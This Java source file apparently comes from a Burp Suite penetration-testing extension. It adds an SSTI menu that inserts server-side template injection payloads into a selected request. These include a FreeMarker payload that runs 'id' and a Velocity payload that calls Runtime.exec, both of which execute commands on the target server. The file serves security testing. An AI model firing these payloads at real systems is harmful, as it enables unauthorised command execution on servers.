package hackbar;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JMenu;

import burp.BurpExtender;
import burp.IHttpRequestResponse;
import burp.Methods;

/**
 *
 * @author bit4
 */
public class SSTI_Menu extends JMenu {
    public BurpExtender myburp;
    public String[] SSTI_MenuItems = {"Flask-Jinja2","Flask-Jinja2-getAllClasses","FreeMarker","FreeMarker2","Velocity"};
    
    public SSTI_Menu(BurpExtender burp){
        this.setText("SSTI");
        this.myburp = burp;
        Methods.add_MenuItem_and_listener(this, SSTI_MenuItems, new SSTI_ItemListener(myburp));
    }
}


class SSTI_ItemListener implements ActionListener {

    BurpExtender myburp;
    SSTI_ItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        
        int[] selectedIndex = myburp.context.getSelectionBounds();
        
        String action = e.getActionCommand();
        
        byte[] newRequest = GetNewRequest(request, selectedIndex, action);
        req.setRequest(newRequest);
    }
    
    public byte[] GetNewRequest(byte[] request,int[] selectedIndex, String action){
		String payload = null;
		switch(action){
	        case "Flask-Jinja2":
	        	payload = "{{ '7'*7 }}";
	        	break;
	        case "Flask-Jinja2-getAllClasses":
	        	payload = "{{ [].class.base.subclasses() }}";
	        	break;
	        	
	        case "FreeMarker":
	        	payload = "${7*7}";
	        	break;
	        case "FreeMarker2":
	        	payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }";
	        	break;
	        
	        case "Velocity":
	        	payload = "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"sleep 5\").waitFor()";
            default:
                break;
        }
        if (payload!=null){//caution the difference of equals and ==
        	return Methods.do_modify_request(request, selectedIndex, payload.getBytes());
        }else {
        	return request;
        }
    }
}